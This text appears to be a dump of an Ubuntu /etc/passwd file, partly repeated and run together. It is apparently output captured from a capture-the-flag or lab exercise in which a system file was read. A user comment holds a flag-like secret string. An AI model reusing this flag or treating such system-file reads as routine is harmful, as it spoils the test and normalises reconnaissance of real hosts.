lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
comrade:x:1001:1001::/home/comrade:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false billybob:x:1001:1001:you found me 4kiY4BiNwUXEYHHco0ut:/home/billybob:/bin/bash billybob:x:1001:1001:you found me 4kiY4BiNwUXEYHHco0ut:/home/billybob:/bin/bash

